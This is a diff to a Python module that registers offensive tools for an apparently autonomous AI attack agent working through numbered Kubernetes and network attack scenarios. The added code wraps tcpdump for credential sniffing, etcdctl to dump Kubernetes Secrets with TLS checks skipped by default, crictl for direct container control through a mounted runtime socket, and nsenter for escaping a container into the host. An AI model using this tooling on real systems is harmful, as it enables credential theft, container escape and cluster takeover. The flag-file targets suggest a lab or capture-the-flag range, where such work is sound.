@@ -906,7 +906,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register_shell_tool(
         name="shell_exec",
         command_template="{command} 2>&1",
-        description="Execute an arbitrary shell command locally. Use for: SSH key generation (ssh-keygen), compiling kernel exploits (gcc), running Python/Perl scripts, file operations, and any task not covered by specialized tools.",
+        description="Execute a shell command on the LOCAL DARWIN host (NOT the target). Use ONLY for local operations: SSH keygen, compiling exploits, running local scripts, reading local files. For REMOTE service interaction (etcd, databases, K8s, SSH), use that service's dedicated tool — do NOT substitute shell_exec to run etcdctl/kubectl/ssh locally.",
         parameters={
             "command": {"type": "string", "description": "Full shell command to execute locally"},
         },
@@ -2441,6 +2441,25 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         description="Check cloud metadata endpoints for AWS, GCP, Azure, Alicloud, and DigitalOcean. Extracts instance info, IAM credentials, and service account tokens. Use when inside a container or VM on cloud infrastructure — cloud credentials can enable lateral movement to cloud services.",
         parameters={},
     )
+
+    # ── Network Capture ─────────────────────────────────────────
+    # Packet capture for network attack scenarios (NET-01/02/03)
+    # and K8s network attacks (K8S-22/24).
+
+    gateway.register_shell_tool(
+        name="tcpdump_capture",
+        command_template="timeout {duration} tcpdump -i {interface} -n {filter} {opts} 2>&1 | head -200",
+        description="Capture network packets using tcpdump. Use for ARP spoofing detection (filter='arp'), DNS exfiltration analysis (filter='udp port 53'), credential sniffing (filter='tcp port 80 or tcp port 443'), and K8s network attacks. Common filters: 'arp', 'udp port 53', 'host 10.0.0.1', 'tcp port 80', 'icmp'. Use opts='-A' for ASCII payload, '-X' for hex+ASCII, '-c 100' for packet count limit.",
+        parameters={
+            "interface": {"type": "string", "description": "Network interface to capture on (e.g. 'eth0', 'any', 'docker0')", "default": "eth0"},
+            "filter": {"type": "string", "description": "BPF filter expression (e.g. 'udp port 53' for DNS, 'arp' for ARP, 'tcp port 80' for HTTP)", "default": ""},
+            "duration": {"type": "integer", "description": "Capture duration in seconds", "default": 30},
+            "opts": {"type": "string", "description": "Additional tcpdump options: '-A' for ASCII output, '-X' for hex+ASCII, '-c N' for packet count limit", "default": "-A"},
+        },
+        parser=_parse_shell_output,
+        timeout=45,
+    )
+
     gateway.register_shell_tool(
         name="kubectl_get_pods",
         command_template="kubectl get pods -A -o json 2>&1 | head -200",
@@ -2462,17 +2481,49 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=60,
     )
-    gateway.register_shell_tool(
+    async def _etcdctl_get(
+        endpoint: str, key: str = "/", output_opts: str = "",
+        insecure: bool = True, cacert: str = "", cert: str = "", tls_key: str = "",
+    ) -> ToolResult:
+        """Query etcd key-value store directly.
+
+        etcd stores all Kubernetes cluster state including Secrets.
+        For HTTPS endpoints, --insecure-skip-tls-verify is added by default
+        (set insecure=false to disable). When etcd client certs are available,
+        pass cacert/cert/tls_key paths for mutual TLS authentication.
+        """
+        _tls_opts = ""
+        if "https://" in (endpoint or ""):
+            if insecure:
+                _tls_opts += " --insecure-skip-tls-verify"
+            if cacert:
+                _tls_opts += f" --cacert={cacert}"
+            if cert:
+                _tls_opts += f" --cert={cert}"
+            if tls_key:
+                _tls_opts += f" --key={tls_key}"
+        _cmd = (
+            f"ETCDCTL_API=3 etcdctl --endpoints={endpoint}{_tls_opts} "
+            f"get {key} {output_opts} 2>&1 | head -200"
+        )
+        result = await _run_shell(_cmd, timeout=30)
+        return ToolResult(tool_name="etcdctl_get", success=result.exit_code == 0,
+            stdout=result.stdout[:4000], stderr=result.stderr,
+            exit_code=result.exit_code, elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
         name="etcdctl_get",
-        command_template="ETCDCTL_API=3 etcdctl --endpoints={endpoint} get {key} {output_opts} 2>&1 | head -200",
-        description="Query etcd key-value store directly. etcd stores all Kubernetes cluster state including Secrets. Use '--prefix --keys-only' for exploration (key discovery), or specify a specific key with '-o json' to read its full value (including base64-encoded Secret data). Requires network access to etcd (port 2379).",
+        func=_etcdctl_get,
+        description="Query etcd key-value store directly. etcd stores all Kubernetes cluster state including Secrets. For HTTPS endpoints automatically adds --insecure-skip-tls-verify (override with insecure=false). Supports mutual TLS via cacert/cert/tls_key params. Use --prefix --keys-only for exploration, -o json for full values.",
         parameters={
             "endpoint": {"type": "string", "description": "etcd endpoint (e.g. 'http://localhost:11379', 'https://10.0.0.1:2379')"},
-            "key": {"type": "string", "description": "etcd key to read. Use '/' with --prefix for all keys, or a specific path like '/registry/secrets/namespace/secretname'"},
+            "key": {"type": "string", "description": "etcd key to read. Default '/' with --prefix for all keys, or a specific path like '/registry/secrets/namespace/secretname'"},
             "output_opts": {"type": "string", "description": "Additional etcdctl options. Use '--prefix --keys-only' for key discovery, '-o json' for full value output of a specific key, '--prefix -o json' for all keys with values"},
+            "insecure": {"type": "boolean", "description": "Skip TLS certificate verification for HTTPS endpoints (default true). Set false if valid certs available."},
+            "cacert": {"type": "string", "description": "Path to CA certificate for TLS verification (e.g. /etc/kubernetes/pki/etcd/ca.crt)"},
+            "cert": {"type": "string", "description": "Path to client certificate for mutual TLS (e.g. /etc/kubernetes/pki/etcd/server.crt)"},
+            "tls_key": {"type": "string", "description": "Path to client key for mutual TLS (e.g. /etc/kubernetes/pki/etcd/server.key)"},
         },
-        parser=_parse_shell_output,
-        timeout=30,
     )
     gateway.register_shell_tool(
         name="kubelet_probe",
@@ -2973,6 +3024,37 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         },
     )
 
+    # ── CRI Runtime Interaction ─────────────────────────────────
+    # crictl for containerd/CRI-O socket attacks (K8S-16).
+
+    gateway.register_shell_tool(
+        name="crictl_cmd",
+        command_template="crictl --runtime-endpoint {endpoint} {action} {args} 2>&1 | head -200",
+        description="Interact with containerd/CRI-O runtime via crictl. Use for K8S-16 CRI socket attacks — when /run/containerd/containerd.sock is mounted, bypass K8s API and directly control containers on the node. Actions: 'pods' (list pods), 'ps -a' (list all containers), 'inspect CONTAINER_ID' (container details), 'exec CONTAINER_ID CMD' (execute in container), 'images' (list images), 'pull IMAGE' (pull image).",
+        parameters={
+            "endpoint": {"type": "string", "description": "CRI socket path (e.g. 'unix:///run/containerd/containerd.sock')", "default": "unix:///run/containerd/containerd.sock"},
+            "action": {"type": "string", "description": "CRI action: pods, ps, inspect, exec, images, pull"},
+            "args": {"type": "string", "description": "Arguments for the action (container ID for inspect/exec, image name for pull, '-a' for ps)", "default": ""},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+
+    # ── Namespace Escape ────────────────────────────────────────
+    # nsenter for container namespace escape (K8S-11/14/23).
+
+    gateway.register_shell_tool(
+        name="nsenter_exec",
+        command_template="nsenter --target {target_pid} --mount --pid --net --ipc --uts {command} 2>&1",
+        description="Execute a command in host namespaces via nsenter. Use for container escape when privileged (K8S-11: privileged:true) or hostPID enabled (K8S-23). Target PID 1 for host init. For chroot-based access, also try: nsenter --target 1 --mount cat /host-flag/flag.txt. Works when the container has CAP_SYS_ADMIN or is privileged.",
+        parameters={
+            "target_pid": {"type": "integer", "description": "Target PID whose namespaces to enter (1 for host init, or host PID visible with hostPID=true)", "default": 1},
+            "command": {"type": "string", "description": "Command to execute in target namespaces (e.g. 'cat /flag.txt', 'id', 'ls /host-flags/')", "default": "id"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
     async def container_escape_cgroup(
         shell_cmd: str, subsystem: str = "memory",
     ) -> ToolResult:
@@ -3430,33 +3512,49 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     async def k8s_etcd_keys(
         endpoint: str, key: str = "/", prefix: bool = True,
+        insecure: bool = True, cacert: str = "", cert: str = "", tls_key: str = "",
     ) -> ToolResult:
         """Enumerate etcd keys for K8s secret discovery.
 
-        Reads K8s secrets directly from etcd when the etcd endpoint is accessible
-        without authentication. Equivalent to CDK's etcd-get-k8s-token.
+        Reads K8s secrets directly from etcd when the etcd endpoint is accessible.
+        Equivalent to CDK's etcd-get-k8s-token.
 
-        Use when: etcd port 2379 is accessible and unauthenticated.
+        For HTTPS endpoints adds --insecure-skip-tls-verify by default.
+        When etcd client certs are available, pass cacert/cert/tls_key paths.
         Start with key='/' and prefix=true for discovery, then target specific keys.
         """
+        _tls_opts = ""
+        if "https://" in (endpoint or ""):
+            if insecure:
+                _tls_opts += " --insecure-skip-tls-verify"
+            if cacert:
+                _tls_opts += f" --cacert={cacert}"
+            if cert:
+                _tls_opts += f" --cert={cert}"
+            if tls_key:
+                _tls_opts += f" --key={tls_key}"
         prefix_flag = "--prefix" if prefix else ""
         exec_cmd = (
-            f"ETCDCTL_API=3 etcdctl --endpoints={endpoint} "
+            f"ETCDCTL_API=3 etcdctl --endpoints={endpoint}{_tls_opts} "
             f"get {key} {prefix_flag} --keys-only 2>&1 | head -100"
         )
         result = await _run_shell(exec_cmd, timeout=30)
-        return ToolResult(tool_name="k8s_etcd_keys", success=True,
-            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
-            elapsed_ms=result.elapsed_ms)
+        return ToolResult(tool_name="k8s_etcd_keys", success=result.exit_code == 0,
+            stdout=result.stdout[:3000], stderr=result.stderr,
+            exit_code=result.exit_code, elapsed_ms=result.elapsed_ms)
 
     gateway.register(
         name="k8s_etcd_keys",
         func=k8s_etcd_keys,
-        description="ENUMERATE etcd keys for K8s secrets. Reads directly from etcd (port 2379) without API server. Use when etcd is accessible (check with 'curl http://host:2379/version'). Start with key='/' and prefix=true to discover all keys. More direct than k8s_secret_dump — reads raw base64-encoded secrets from etcd.",
+        description="ENUMERATE etcd keys for K8s secrets. Reads directly from etcd (port 2379) without API server. Use when etcd is accessible. For HTTPS endpoints auto-skips TLS verify. Supports mutual TLS via cacert/cert/tls_key params. Start with key='/' and prefix=true to discover all keys. More direct than k8s_secret_dump — reads raw base64-encoded secrets from etcd.",
         parameters={
             "endpoint": {"type": "string", "description": "etcd endpoint URL (e.g. 'http://localhost:2379', 'https://10.0.0.1:2379')"},
             "key": {"type": "string", "description": "etcd key path to read (default '/' for all keys)"},
             "prefix": {"type": "boolean", "description": "Use --prefix for recursive key listing (default true)"},
+            "insecure": {"type": "boolean", "description": "Skip TLS certificate verification for HTTPS endpoints (default true)"},
+            "cacert": {"type": "string", "description": "Path to CA certificate for TLS verification (e.g. /etc/kubernetes/pki/etcd/ca.crt)"},
+            "cert": {"type": "string", "description": "Path to client certificate for mutual TLS"},
+            "tls_key": {"type": "string", "description": "Path to client key for mutual TLS"},
         },
     )
 
